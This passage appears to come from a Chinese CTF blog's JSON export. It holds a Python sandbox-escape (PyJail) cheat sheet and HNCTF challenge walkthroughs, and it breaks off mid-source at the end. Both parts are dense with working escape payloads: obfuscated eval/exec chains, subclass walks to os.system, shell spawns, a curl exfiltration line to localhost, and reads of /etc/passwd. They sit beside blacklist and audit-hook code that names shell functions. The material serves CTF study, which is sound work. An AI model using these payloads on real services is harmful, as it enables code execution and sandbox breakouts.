eval(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)+chr(40)+chr(39)+chr(111)+chr(115)+chr(39)+chr(41)) =\u003e __import__(\"os\") #bytes 函数 bytes([46, 47, 102, 108, 97, 103]).decode() =\u003e './flag' #编码绕过 \u003e\u003e\u003e import base64 \u003e\u003e\u003e base64.b64encode('__import__') 'X19pbXBvcnRfXw==' 'X19pbXBvcnRfXw=='.decode('base64') =\u003e '__import__' \u003e\u003e\u003e __builtins__.__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base64')).system('calc') #进制转换 八进制： exec(\"print('RCE'); __import__('os').system('ls')\") exec(\"\\137\\137\\151\\155\\160\\157\\162\\164\\137\\137\\50\\47\\157\\163\\47\\51\\56\\163\\171\\163\\164\\145\\155\\50\\47\\154\\163\\47\\51\") exp： s = \"eval(list(dict(v_a_r_s=True))[len([])][::len(list(dict(aa=()))[len([])])])(__import__(list(dict(b_i_n_a_s_c_i_i=1))[False][::len(list(dict(aa=()))[len([])])]))[list(dict(a_2_b___b_a_s_e_6_4=1))[False][::len(list(dict(aa=()))[len([])])]](list(dict(X19pbXBvcnRfXygnb3MnKS5wb3BlbignZWNobyBIYWNrZWQ6IGBpZGAnKS5yZWFkKCkg=True))[False])\" octal_string = \"\".join([f\"\\\\{oct(ord(c))[2:]}\" for c in s]) print(octal_string) 十六进制： exec(\"\\x5f\\x5f\\x69\\x6d\\x70\\x6f\\x72\\x74\\x5f\\x5f\\x28\\x27\\x6f\\x73\\x27\\x29\\x2e\\x73\\x79\\x73\\x74\\x65\\x6d\\x28\\x27\\x6c\\x73\\x27\\x29\") exp: s = \"eval(eval(list(dict(v_a_r_s=True))[len([])][::len(list(dict(aa=()))[len([])])])(__import__(list(dict(b_i_n_a_s_c_i_i=1))[False][::len(list(dict(aa=()))[len([])])]))[list(dict(a_2_b___b_a_s_e_6_4=1))[False][::len(list(dict(aa=()))[len([])])]](list(dict(X19pbXBvcnRfXygnb3MnKS5wb3BlbignZWNobyBIYWNrZWQ6IGBpZGAnKS5yZWFkKCkg=True))[False]))\" octal_string = \"\".join([f\"\\\\x{hex(ord(c))[2:]}\" for c in s]) print(octal_string) #逆序绕过 '__tropmi__'[::-1] =\u003e '__import__' \u003e\u003e\u003e eval(')\"imaohw\"(metsys.)\"so\"(__tropmi__'[::-1]) kali \u003e\u003e\u003e exec(')\"imaohw\"(metsys.so ;so tropmi'[::-1]) kali #替换绕过 '__buihf9ns__'.replace('hf9','ldi') =\u003e '__buildins__' #rot13编码绕过 import codecs getattr(os,codecs.encode(\"flfgrz\",'rot13'))('ifconfig') #unicode字符 / Non-ASCII Identifies # 𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗𝐚𝐛𝐜𝐝𝐞𝐟𝐠𝐡𝐢𝐣𝐤𝐥𝐦𝐧𝐨𝐩𝐪𝐫𝐬𝐭𝐮𝐯𝐰𝐱𝐲𝐳 # 𝟘𝟙𝟚𝟛𝟜𝟝𝟞𝟟𝟠𝟡𝕒𝕓𝕔𝕕𝕖𝕗𝕘𝕙𝕚𝕛𝕜𝕝𝕞𝕟𝕠𝕡𝕢𝕣𝕤𝕥𝕦𝕧𝕨𝕩𝕪𝕫 #清空 setattr(__import__(\"__main__\"), \"blacklist\", list()) #过滤eval exec(\"import os;os.system('curl xxx')\") ### `__globals__` 替换 ''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__ ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals ''.__class__.__mro__[2].__subclasses__()[59].__init__.__getattribute__(\"__glo\"+\"bals__\") ### `__mro__`、`__bases__`、`__base__`互换 三者之间可以相互替换 ''.__class__.__mro__[2] [].__class__.__mro__[1] {}.__class__.__mro__[1] ().__class__.__mro__[1] [].__class__.__mro__[-1] {}.__class__.__mro__[-1] ().__class__.__mro__[-1] {}.__class__.__bases__[0] ().__class__.__bases__[0] [].__class__.__bases__[0] [].__class__.__base__ ().__class__.__base__ {}.__class__.__base__ #过滤运算符 == 用 in 来替换 or 可以用| + -...-来替换 e.g: for i in [(100, 100, 1, 1), (100, 2, 1, 2), (100, 100, 1, 2), (100, 2, 1, 1)]: ans = i[0]==i[1] or i[2]==i[3] print(bool(eval(f'{i[0]==i[1]} | {i[2]==i[3]}')) == ans) print(bool(eval(f'- {i[0]==i[1]} - {i[2]==i[3]}')) == ans) print(bool(eval(f'{i[0]==i[1]} + {i[2]==i[3]}')) == ans) and 可以用\u0026 *替代 for i in [(100, 100, 1, 1), (100, 2, 1, 2), (100, 100, 1, 2), (100, 2, 1, 1)]: ans = i[0]==i[1] and i[2]==i[3] print(bool(eval(f'{i[0]==i[1]} \u0026 {i[2]==i[3]}')) == ans) print(bool(eval(f'{i[0]==i[1]} * {i[2]==i[3]}')) == ans) #过滤空格 通过 ()、[] 替换 #过滤() 1.利用装饰器 @ 2.利用魔术方法，例如 enum.EnumMeta.__getitem__ #过滤[] 1.调用__getitem__()函数直接替换； 2.调用 pop()函数（用于移除列表中的一个元素，默认最后一个元素，并且返回该元素的值）替换； ''.__class__.__mro__[-1].__subclasses__()[200].__init__.__globals__['__builtins__']['__import__']('os').system('ls') # __getitem__()替换中括号[] ''.__class__.__","date":"2024-10-14","objectID":"/pyjail_summury/:0:9","series":null,"tags":["misc","manual"],"title":"PyJail姿势总结","uri":"/pyjail_summury/#bypass"},{"categories":["misc","manual"],"content":"\rpython 继承链 # os [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__==\"_wrap_close\"][0][\"system\"](\"ls\") # subprocess [ x for x in ''.__class__.__base__.__subclasses__() if x.__name__ == 'Popen'][0]('ls') # builtins [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__==\"_GeneratorContextManagerBase\" and \"os\" in x.__init__.__globals__ ][0][\"__builtins__\"] # help [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__==\"_GeneratorContextManagerBase\" and \"os\" in x.__init__.__globals__ ][0][\"__builtins__\"]['help'] [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__==\"_wrap_close\"][0]['__builtins__'] #sys [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if \"wrapper\" not in str(x.__init__) and \"sys\" in x.__init__.__globals__ ][0][\"sys\"].modules[\"os\"].system(\"ls\") [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if \"'_sitebuiltins.\" in str(x) and not \"_Helper\" in str(x) ][0][\"sys\"].modules[\"os\"].system(\"ls\") #commands (not very common) [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if \"wrapper\" not in str(x.__init__) and \"commands\" in x.__init__.__globals__ ][0][\"commands\"].getoutput(\"ls\") #pty (not very common) [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if \"wrapper\" not in str(x.__init__) and \"pty\" in x.__init__.__globals__ ][0][\"pty\"].spawn(\"ls\") #importlib [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if \"wrapper\" not in str(x.__init__) and \"importlib\" in x.__init__.__globals__ ][0][\"importlib\"].import_module(\"os\").system(\"ls\") [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if \"wrapper\" not in str(x.__init__) and \"importlib\" in x.__init__.__globals__ ][0][\"importlib\"].__import__(\"os\").system(\"ls\") #imp [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if \"'imp.\" in str(x) ][0][\"importlib\"].import_module(\"os\").system(\"ls\") [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if \"'imp.\" in str(x) ][0][\"importlib\"].__import__(\"os\").system(\"ls\") #pdb [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if \"wrapper\" not in str(x.__init__) and \"pdb\" in x.__init__.__globals__ ][0][\"pdb\"].os.system(\"ls\") # ctypes [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if \"wrapper\" not in str(x.__init__) and \"builtins\" in x.__init__.__globals__ ][0][\"builtins\"].__import__('ctypes').CDLL(None).system('ls /'.encode()) # multiprocessing [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if \"wrapper\" not in str(x.__init__) and \"builtins\" in x.__init__.__globals__ ][0][\"builtins\"].__import__('multiprocessing').Process(target=lambda: __import__('os').system('curl localhost:9999/?a=`whoami`')).start() #file [ x for x in ''.__class__.__base__.__subclasses__() if x.__name__==\"FileLoader\" ][0].get_data(0,\"/etc/passwd\") ","date":"2024-10-14","objectID":"/pyjail_summury/:0:10","series":null,"tags":["misc","manual"],"title":"PyJail姿势总结","uri":"/pyjail_summury/#python-继承链"},{"categories":["misc","manual"],"content":"\r海象运算符海象表达式是 Python 3.8 引入的一种新的语法特性，用于在表达式中同时进行赋值和比较操作。 海象表达式的语法形式如下： \u003cexpression\u003e := \u003cvalue\u003e if \u003ccondition\u003e else \u003cvalue\u003e 借助海象表达式，我们可以通过列表来替代多行代码： \u003e\u003e\u003e eval('[a:=__import__(\"os\"),b:=a.system(\"id\")]') uid=1000(kali) gid=0(root) groups=0(root),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),119(wireshark),122(bluetooth),134(scanner),142(kaboxer) [\u003cmodule 'os' (frozen)\u003e, 0] ","date":"2024-10-14","objectID":"/pyjail_summury/:0:11","series":null,"tags":["misc","manual"],"title":"PyJail姿势总结","uri":"/pyjail_summury/#海象运算符"},{"categories":["misc","manual"],"content":"\rAST 沙箱绕过装饰器 利用 payload 如下: @exec @input class X: pass 当我们输入上述的代码后, Python 会打开输入,此时我们再输入 payload 就可以成功执行命令. \u003e\u003e\u003e @exec ... @input ... class X: ... pass ... \u003cclass '__main__.X'\u003e__import__(\"os\").system(\"ls\") 由于装饰器不会被解析为调用表达式或语句, 因此可以绕过黑名单, 最终传入的 payload 是由 input 接收的, 因此也不会被拦截. 其实这样的话,构造其实可以有很多,比如直接打开 help 函数. @help class X: pass 这样可以直接进入帮助文档: Help on class X in module __main__: class X(builtins.object) | Data descriptors defined here: | | __dict__ | dictionary for instance variables (if defined) | | __weakref__ | list of weak references to the object (if defined) (END) 再次输入 !sh 即可打开 /bin/sh ","date":"2024-10-14","objectID":"/pyjail_summury/:0:12","series":null,"tags":["misc","manual"],"title":"PyJail姿势总结","uri":"/pyjail_summury/#ast-沙箱绕过"},{"categories":["misc","manual"],"content":"\r参考文档https://zhuanlan.zhihu.com/p/578966149 https://lazzzaro.github.io/2020/08/21/misc-%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/index.html https://book.hacktricks.xyz/generic-methodologies-and-resources/python/python-internal-read-gadgets https://xz.aliyun.com/t/12647?time__1311=GqGxuDRiYiwxlrzG7DyGKqita%2BFTQx%3DoD#toc-15 https://dummykitty.github.io/python/2023/05/30/pyjail-bypass-08-%E7%BB%95%E8%BF%87-AST-%E6%B2%99%E7%AE%B1.html https://www.mi1k7ea.com/2019/05/31/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%B0%8F%E7%BB%93/#%E8%BF%87%E6%BB%A4-globals ","date":"2024-10-14","objectID":"/pyjail_summury/:0:13","series":null,"tags":["misc","manual"],"title":"PyJail姿势总结","uri":"/pyjail_summury/#参考文档"},{"categories":["misc","wp"],"content":"通过HNCTF的题目学习PyJail 分析过程和wp主要参考： https://zhuanlan.zhihu.com/p/578966149 ","date":"2024-10-13","objectID":"/hnctf_pyjail/:0:0","series":null,"tags":["misc","wp"],"title":"HNCTF_PyJail练习","uri":"/hnctf_pyjail/#"},{"categories":["misc","wp"],"content":"\rcalc_jail_beginner下载附件 #Your goal is to read ./flag.txt #You can use these payload liked `__import__('os').system('cat ./flag.txt')` or `print(open('/flag.txt').read())` WELCOME = ''' _ ______ _ _ _ _ | | | ____| (_) | | (_) | | |__ | |__ __ _ _ _ __ _ __ ___ _ __ | | __ _ _| | | '_ \\| __| / _` | | '_ \\| '_ \\ / _ \\ '__| _ | |/ _` | | | | |_) | |___| (_| | | | | | | | | __/ | | |__| | (_| | | | |_.__/|______\\__, |_|_| |_|_| |_|\\___|_| \\____/ \\__,_|_|_| __/ | |___/ ''' print(WELCOME) print(\"Welcome to the python jail\") print(\"Let's have an beginner jail of calc\") print(\"Enter your expression and I will evaluate it for you.\") input_data = input(\"\u003e \") print('Answer: {}'.format(eval(input_data))) payload __import__('os').system('sh') ","date":"2024-10-13","objectID":"/hnctf_pyjail/:0:1","series":null,"tags":["misc","wp"],"title":"HNCTF_PyJail练习","uri":"/hnctf_pyjail/#calc_jail_beginner"},{"categories":["misc","wp"],"content":"\rcalc_jail_beginner_level1 #the function of filter will banned some string ',\",i,b #it seems banned some payload #Can u escape it?Good luck! def filter(s): not_allowed = set('\"\\'`ib') return any(c in not_allowed for c in s) WELCOME = ''' _ _ _ _ _ _ _ __ | | (_) (_) (_) | | | | /_ | | |__ ___ __ _ _ _ __ _ __ ___ _ __ _ __ _ _| | | | _____ _____| || | | '_ \\ / _ \\/ _` | | '_ \\| '_ \\ / _ \\ '__| | |/ _` | | | | |/ _ \\ \\ / / _ \\ || | | |_) | __/ (_| | | | | | | | | __/ | | | (_| | | | | | __/\\ V / __/ || | |_.__/ \\___|\\__, |_|_| |_|_| |_|\\___|_| | |\\__,_|_|_| |_|\\___| \\_/ \\___|_||_| __/ | _/ | |___/ |__/ ''' print(WELCOME) print(\"Welcome to the python jail\") print(\"Let's have an beginner jail of calc\") print(\"Enter your expression and I will evaluate it for you.\") input_data = input(\"\u003e \") if filter(input_data): print(\"Oh hacker!\") exit(0) print('Answer: {}'.format(eval(input_data))) 过滤了 双引号，单引号，反引号，i，b payload1 # open('flag').read() open(chr(102)+chr(108)+chr(97)+chr(103)).read() payload2 从显示带有元组的子类入手 ().__class__.__base__.__subclasses__() 其中的b会被ban，使用getattr()函数 getattr(().__class__, '__base__').__subclasses__() 但其中的单引号会被ban，使用ascii2chr的拼接 chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95) 得到 getattr(().__class__, chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)).__subclasses__() 对__subclasses__同样的方式绕过 getattr(getattr(().__class__,chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))() 倒数第四个子类\u003cclass 'os._wrap_close'\u003e，则payload ().__class__.__base__.__subclasses__()[-4].__init__.__globals__['system']('sh') 使用以上方法绕过，得到 getattr(getattr(getattr(getattr(().__class__,chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()[-4],chr(95)+chr(95)+chr(105)+chr(110)+chr(105)+chr(116)+chr(95)+chr(95)),chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95))[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(115)+chr(104)) ","date":"2024-10-13","objectID":"/hnctf_pyjail/:0:2","series":null,"tags":["misc","wp"],"title":"HNCTF_PyJail练习","uri":"/hnctf_pyjail/#calc_jail_beginner_level1"},{"categories":["misc","wp"],"content":"\rcalc_jail_beginner_level2 #the length is be limited less than 13 #it seems banned some payload #Can u escape it?Good luck! WELCOME = ''' _ _ _ _ _ _ _ ___ | | (_) (_) (_) | | | | |__ \\ | |__ ___ __ _ _ _ __ _ __ ___ _ __ _ __ _ _| | | | _____ _____| | ) | | '_ \\ / _ \\/ _` | | '_ \\| '_ \\ / _ \\ '__| | |/ _` | | | | |/ _ \\ \\ / / _ \\ | / / | |_) | __/ (_| | | | | | | | | __/ | | | (_| | | | | | __/\\ V / __/ |/ /_ |_.__/ \\___|\\__, |_|_| |_|_| |_|\\___|_| | |\\__,_|_|_| |_|\\___| \\_/ \\___|_|____| __/ | _/ | |___/ |__/ ''' print(WELCOME) print(\"Welcome to the python jail\") print(\"Let's have an beginner jail of calc\") print(\"Enter your expression and I will evaluate it for you.\") input_data = input(\"\u003e \") if len(input_data)\u003e13: print(\"Oh hacker!\") exit(0) print('Answer: {}'.format(eval(input_data))) 限制传入字符不大于13 参数逃逸 exec(input()) __import__('os').system('sh') ","date":"2024-10-13","objectID":"/hnctf_pyjail/:0:3","series":null,"tags":["misc","wp"],"title":"HNCTF_PyJail练习","uri":"/hnctf_pyjail/#calc_jail_beginner_level2"},{"categories":["misc","wp"],"content":"\rcalc_jail_beginner_level2.5 #the length is be limited less than 13 #it seems banned some payload #banned some unintend sol #Can u escape it?Good luck! def filter(s): BLACKLIST = [\"exec\",\"input\",\"eval\"] for i in BLACKLIST: if i in s: print(f'{i!r} has been banned for security reasons') exit(0) WELCOME = ''' _ _ _ _ _ _ _ ___ _____ | | (_) (_) (_) | | | |__ \\ | ____| | |__ ___ __ _ _ _ __ _ __ ___ _ __ _ __ _ _| | | _____ _____| | ) | | |__ | '_ \\ / _ \\/ _` | | '_ \\| '_ \\ / _ \\ '__| | |/ _` | | | |/ _ \\ \\ / / _ \\ | / / |___ \\ | |_) | __/ (_| | | | | | | | | __/ | | | (_| | | | | __/\\ V / __/ |/ /_ _ ___) | |_.__/ \\___|\\__, |_|_| |_|_| |_|\\___|_| | |\\__,_|_|_|_|\\___| \\_/ \\___|_|____(_)____/ __/ | _/ | |___/ |__/ ''' print(WELCOME) print(\"Welcome to the python jail\") print(\"Let's have an beginner jail of calc\") print(\"Enter your expression and I will evaluate it for you.\") input_data = input(\"\u003e \") filter(input_data) if len(input_data)\u003e13: print(\"Oh hacker!\") exit(0) print('Answer: {}'.format(eval(input_data))) payload breakpoint() 就会进到Pdb里面，随后pj直接一句话RCE ","date":"2024-10-13","objectID":"/hnctf_pyjail/:0:4","series":null,"tags":["misc","wp"],"title":"HNCTF_PyJail练习","uri":"/hnctf_pyjail/#calc_jail_beginner_level25"},{"categories":["misc","wp"],"content":"\rcalc_jail_beginner_level3 #!/usr/bin/env python3 WELCOME = ''' _ _ _ _ _ _ _ ____ | | (_) (_) (_) | | | | |___ \\ | |__ ___ __ _ _ _ __ _ __ ___ _ __ _ __ _ _| | | | _____ _____| | __) | | '_ \\ / _ \\/ _` | | '_ \\| '_ \\ / _ \\ '__| | |/ _` | | | | |/ _ \\ \\ / / _ \\ ||__ \u003c | |_) | __/ (_| | | | | | | | | __/ | | | (_| | | | | | __/\\ V / __/ |___) | |_.__/ \\___|\\__, |_|_| |_|_| |_|\\___|_| | |\\__,_|_|_| |_|\\___| \\_/ \\___|_|____/ __/ | _/ | |___/ |__/ ''' print(WELCOME) #the length is be limited less than 7 #it seems banned some payload #Can u escape it?Good luck! print(\"Welcome to the python jail\") print(\"Let's have an beginner jail of calc\") print(\"Enter your expression and I will evaluate it for you.\") input_data = input(\"\u003e \") if len(input_data)\u003e7: print(\"Oh hacker!\") exit(0) res = eval(input_data) print('Answer: {}'.format(res)) 限制传入字符不大于7 可以通过help函数来进行RCE 开始输入help()，进入到help界面，然后随便找个模块，例如os输入，此时就会显示os模块的帮助页面，输入!sh就能进到shell里面去。 payload help() os !cat flag ","date":"2024-10-13","objectID":"/hnctf_pyjail/:0:5","series":null,"tags":["misc","wp"],"title":"HNCTF_PyJail练习","uri":"/hnctf_pyjail/#calc_jail_beginner_level3"},{"categories":["misc","wp"],"content":"\rpython2 input # It's escape this repeat! WELCOME = ''' _ _ ___ ___ _____ _ _ _ | | | | / _ \\ |__ \\ |_ _| | | | | | _ __ _ _| |_| |__ | | | |_ __ ) | | | _ __ _ __ | | | | |_ | '_ \\| | | | __| '_ \\| | | | '_ \\ / / | | | '_ \\| '_ \\| | | | __| | |_) | |_| | |_| | | | |_| | | | |/ /_ _| |_| | | | |_) | |__| | |_ | .__/ \\__, |\\__|_| |_|\\___/|_| |_|____| |_____|_| |_| .__/ \\____/ \\__| | | __/ | | | |_| |___/ |_| ''' print WELCOME print \"Welcome to the python jail\" print \"But this program will repeat your messages\" input_data = input(\"\u003e \") print input_data 在python 2中，input函数从标准输入接收输入，并且自动eval求值，返回求出来的值； 在python 2中，raw_input函数从标准输入接收输入，返回输入字符串； 在python 3中，input函数从标准输入接收输入，返回输入字符串； 可以认为，python 2 input() = python 2 eval(raw_input()) = python 3 eval(input()) 如果碰到python 2中间用了input函数，那么我们就可以直接一句话RCE： __import__('os').system('sh') ","date":"2024-10-13","objectID":"/hnctf_pyjail/:0:6","series":null,"tags":["misc","wp"],"title":"HNCTF_PyJail练习","uri":"/hnctf_pyjail/#python2-input"},{"categories":["misc","wp"],"content":"\rlake lake lake #it seems have a backdoor #can u find the key of it and use the backdoor fake_key_var_in_the_local_but_real_in_the_remote = \"[DELETED]\" def func(): code = input(\"\u003e\") if(len(code)\u003e9): return print(\"you're hacker!\") try: print(eval(code)) except: pass def backdoor(): print(\"Please enter the admin key\") key = input(\"\u003e\") if(key == fake_key_var_in_the_local_but_real_in_the_remote): code = input(\"\u003e\") try: print(eval(code)) except: pass else: print(\"Nooo!!!!\") WELCOME = ''' _ _ _ _ _ _ | | | | | | | | | | | | | | __ _| | _____ | | __ _| | _____ | | __ _| | _____ | |/ _` | |/ / _ \\ | |/ _` | |/ / _ \\ | |/ _` | |/ / _ \\ | | (_| | \u003c __/ | | (_| | \u003c __/ | | (_| | \u003c __/ |_|\\__,_|_|\\_\\___| |_|\\__,_|_|\\_\\___| |_|\\__,_|_|\\_\\___| ''' print(WELCOME) print(\"Now the program has two functions\") print(\"can you use dockerdoor\") print(\"1.func\") print(\"2.backdoor\") input_data = input(\"\u003e \") if(input_data == \"1\"): func() exit(0) elif(input_data == \"2\"): backdoor() exit(0) else: print(\"not found the choice\") exit(0) 这个key变量是全局变量，可以用globals()来泄露所有全局变量的值 globals() __import__('os').system('sh') cat flag ","date":"2024-10-13","objectID":"/hnctf_pyjail/:0:7","series":null,"tags":["misc","wp"],"title":"HNCTF_PyJail练习","uri":"/hnctf_pyjail/#lake-lake-lake"},{"categories":["misc","wp"],"content":"\rl@ke l@ke l@ke #it seems have a backdoor as `lake lake lake` #but it seems be limited! #can u find the key of it and use the backdoor fake_key_var_in_the_local_but_real_in_the_remote = \"[DELETED]\" def func(): code = input(\"\u003e\") if(len(code)\u003e6): return print(\"you're hacker!\") try: print(eval(code)) except: pass def backdoor(): print(\"Please enter the admin key\") key = input(\"\u003e\") if(key == fake_key_var_in_the_local_but_real_in_the_remote): code = input(\"\u003e\") try: print(eval(code)) except: pass else: print(\"Nooo!!!!\") WELCOME = ''' _ _ _ _ _ _ | | ____ | | | | ____ | | | | ____ | | | | / __ \\| | _____ | | / __ \\| | _____ | | / __ \\| | _____ | |/ / _` | |/ / _ \\ | |/ / _` | |/ / _ \\ | |/ / _` | |/ / _ \\ | | | (_| | \u003c __/ | | | (_| | \u003c __/ | | | (_| | \u003c __/ |_|\\ \\__,_|_|\\_\\___| |_|\\ \\__,_|_|\\_\\___| |_|\\ \\__,_|_|\\_\\___| \\____/ \\____/ \\____/ ''' print(WELCOME) print(\"Now the program has two functions\") print(\"can you use dockerdoor\") print(\"1.func\") print(\"2.backdoor\") input_data = input(\"\u003e \") if(input_data == \"1\"): func() exit(0) elif(input_data == \"2\"): backdoor() exit(0) else: print(\"not found the choice\") exit(0) calc_jail_beginner_level3的方法不能完全生效 help() __main__ //拿到key 随后一句话RCE ","date":"2024-10-13","objectID":"/hnctf_pyjail/:0:8","series":null,"tags":["misc","wp"],"title":"HNCTF_PyJail练习","uri":"/hnctf_pyjail/#lke-lke-lke"},{"categories":["misc","wp"],"content":"\rlaKe laKe laKe #You finsih these two challenge of leak #So cool #Now it's time for laKe!!!! import random from io import StringIO import sys sys.addaudithook BLACKED_LIST = ['compile', 'eval', 'exec', 'open'] eval_func = eval open_func = open for m in BLACKED_LIST: del __builtins__.__dict__[m] def my_audit_hook(event, _): BALCKED_EVENTS = set({'pty.spawn', 'os.system', 'os.exec', 'os.posix_spawn','os.spawn','subprocess.Popen'}) if event in BALCKED_EVENTS: raise RuntimeError('Operation banned: {}'.format(event)) def guesser(): game_score = 0 sys.stdout.write('Can u guess the number? between 1 and 9999999999999 \u003e ') sys.stdout.flush() right_guesser_question_answer = random.randint(1, 9999999999999) sys.stdout, sys.stderr, challenge_original_stdout = StringIO(), StringIO(), sys.stdout try: input_data = eval_func(input(''),{},{}) except Exception: sys.stdout = challenge_original_stdout print(\"Seems not right! please guess it!\") return game_score sys.stdout = challenge_original_stdout if input_data == right_guesser_question_answer: game_score += 1 return game_score WELCOME=''' _ _ __ _ _ __ _ _ __ | | | |/ / | | | |/ / | | | |/ / | | __ _| ' / ___ | | __ _| ' / ___ | | __ _| ' / ___ | |/ _` | \u003c / _ \\ | |/ _` | \u003c / _ \\ | |/ _` | \u003c / _ \\ | | (_| | . \\ __/ | | (_| | . \\ __/ | | (_| | . \\ __/ |_|\\__,_|_|\\_\\___| |_|\\__,_|_|\\_\\___| |_|\\__,_|_|\\_\\___| ''' def main(): print(WELCOME) print('Welcome to my guesser game!') game_score = guesser() if game_score == 1: print('you are really super guesser!!!!') print(open_func('flag').read()) else: print('Guess game end!!!') if __name__ == '__main__': sys.addaudithook(my_audit_hook) main() 这道题涉及到对python random库中函数的分析 分析过程参考 https://zhuanlan.zhihu.com/p/579057932 payload [random:=__import__('random'), state:=random.getstate(), pre_state:=list(state[1])[:624], random.setstate((3,tuple(pre_state+[0]),None)), random.randint(1, 9999999999999)][-1] ","date":"2024-10-13","objectID":"/hnctf_pyjail/:0:9","series":null,"tags":["misc","wp"],"title":"HNCTF_PyJail练习","uri":"/hnctf_pyjail/#lake-lake-lake-1"},{"categories":["misc","wp"],"content":"\r4 byte command题目无附件，有回显 _ _ _ _ _ _ _ _ _ | | (_) (_) (_) | | | | | || | | |__ ___ __ _ _ _ __ _ __ ___ _ __ _ __ _ _| | | | _____ _____| | || |_ | '_ \\ / _ \\/ _` | | '_ \\| '_ \\ / _ \\ '__| | |/ _` | | | | |/ _ \\ \\ / / _ \\ |__ _| | |_) | __/ (_| | | | | | | | | __/ | | | (_| | | | | | __/\\ V / __/ | | | |_.__/ \\___|\\__, |_|_| |_|_| |_|\\___|_| | |\\__,_|_|_| |_|\\___| \\_/ \\___|_| |_| __/ | _/ | |___/ |__/ Welcome to the python jail Let's have an beginner jail of calc Enter your expression and I will evaluate it for you. \u003e payload sh cat flag 另外，读取server.py发现 if len(input_data)\u003e4: print(\"Oh hacker!\") exit(0) print('Answer: {}'.format(os.system(input_data))) 直接将输入的内容作为os.system()参数 其他短字符串绕过姿势可以参考 https://xiaolong22333.top/archives/201/ ","date":"2024-10-13","objectID":"/hnctf_pyjail/:0:10","series":null,"tags":["misc","wp"],"title":"HNCTF_PyJail练习","uri":"/hnctf_pyjail/#4-byte-command"},{"categories":["misc","wp"],"content":"\rlak3 lak3 lak3 #Hi hackers,lak3 comes back #Have a good luck on it! :Wink: import random from io import StringIO import sys sys.addaudithook BLACKED_LIST = ['compile', 'eval', 'exec'] eval_func = eval open_func = open for m in BLACKED_LIST: del __builtins__.__dict__[m] def my_audit_hook(event, _): BALCKED_EVENTS = set({'pty.spawn', 'os.system', 'os.exec', 'os.posix_spawn','os.spawn','subprocess.Popen','code.__new__','function.__new__','cpython._PySys_ClearAuditHooks','open'}) if event in BALCKED_EVENTS: raise RuntimeError('Operation banned: {}'.format(event)) def guesser(): game_score = 0 sys.stdout.write('Can u guess the number? between 1 and 9999999999999 \u003e ') sys.stdout.flush() right_guesser_question_answer = random.randint(1, 9999999999999) sys.stdout, sys.stderr, challenge_original_stdout = StringIO(), StringIO(), sys.stdout try: input_data = eval_func(input(''),{},{}) except Exception: sys.stdout = challenge_original_stdout print(\"Seems not right! please guess it!\") return game_score sys.stdout = challenge_original_stdout if input_data == right_guesser_question_answer: game_score += 1 return game_score WELCOME=''' _ _ ____ _ _ ____ _ _ ____ | | | | |___ \\ | | | | |___ \\ | | | | |___ \\ | | __ _| | __ __) | | | __ _| | __ __) | | | __ _| | __ __) | | |/ _` | |/ /|__ \u003c | |/ _` | |/ /|__ \u003c | |/ _` | |/ /|__ \u003c | | (_| | \u003c ___) | | | (_| | \u003c ___) | | | (_| | \u003c ___) | |_|\\__,_|_|\\_\\____/ |_|\\__,_|_|\\_\\____/ |_|\\__,_|_|\\_\\____/ ''' def main(): print(WELCOME) print('Welcome to my guesser game!') game_score = guesser() if game_score == 1: print('you are really super guesser!!!!') print('flag{fake_flag_in_local_but_really_in_The_remote}') else: print('Guess game end!!!') if __name__ == '__main__': sys.addaudithook(my_audit_hook) main() ","date":"2024-10-13","objectID":"/hnctf_pyjail/:0:11","series":null,"tags":["misc","wp"],"title":"HNCTF_PyJail练习","uri":"/hnctf_pyjail/#lak3-lak3-lak3"},{"categories":["misc","wp"],"content":"\rtyPe Ch@nnEl MY_FLAG = \"NSSCTF{fake_flag_in_local_but_really_in_The_remote}\" BLACED_KLIST = '\"%\u0026\\',-/_:;@\\\\`{|}~*\u003c=\u003e[] \\t\\n\\r' def my_safe_check(n): return all(ord(m) \u003c 0x7f for m in n) and all(m not in n for m in BLACED_KLIST) def my_safe_eval(m, my_func): if not my_safe_check(m): print(\"Hacker!!!!\") else: try: print(eval(f\"{my_func.__name__}({m})\", {\"__builtins__\": {my_func.__name__: my_func}, \"flag\": MY_FLAG})) except: print(\"Try again!\") if __name__ 